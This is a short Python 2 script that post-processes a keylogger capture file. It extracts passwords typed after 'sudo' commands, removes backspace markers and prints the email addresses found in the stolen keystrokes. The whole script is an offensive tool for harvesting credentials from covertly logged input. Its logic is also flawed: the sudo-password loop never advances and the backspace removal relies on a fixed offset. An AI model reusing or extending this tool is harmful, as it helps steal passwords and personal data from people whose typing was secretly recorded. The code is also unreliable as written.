
import re

def printmails(file):
    regex_mail = re.compile(r"(\w+)@(\w+\.[a-zA-Z]{2,4})(\.[a-zA-Z]{2})?")
    for m in regex_mail.finditer(file):
        g = m.groups()
        if g[2] == None:
                print "%s@%s" % (g[0], g[1])
        else:
                print "%s@%s%s" % g

def remove_backspace(file):
    regex_backspace = re.compile(r"(\w+)({BACKSPACE})")
    c = regex_backspace.search(file)
    while c:
        #print regex_backspace.search(file).group(0)
        #print regex_backspace.search(file).group(1)
        #print regex_backspace.search(file).group(2)
        start= file.index(regex_backspace.search(file).group(2))-1
        end=  file.index(regex_backspace.search(file).group(2))+11
        #print start, end
        file = file[:start]+file[end:]
        c = regex_backspace.search(file)
        
    return file
    
def find_sudo_pass(file):
    regex_sudo = re.compile(r"(sudo [\-\w]+){ENTER}(\w+)({ENTER})")
    print "sudo" + str(regex_sudo.search(file))
    reg = regex_sudo.search(file) 
    print regex_sudo.search(file).group(2)
    while reg:
        
        pass_start = file.index(regex_sudo.search(file).group(2))
        pass_end = file.index(regex_sudo.search(file).group(3))
        passwd = file[pass_start:pass_end]
        print passwd
        reg = regex_sudo.search(file) 
    
if __name__ == "__main__":
    
    file = open('/home/peon/keylog.txt', 'r').read()
    find_sudo_pass(file)
    file = remove_backspace(file)
    print file
    printmails(file)
    
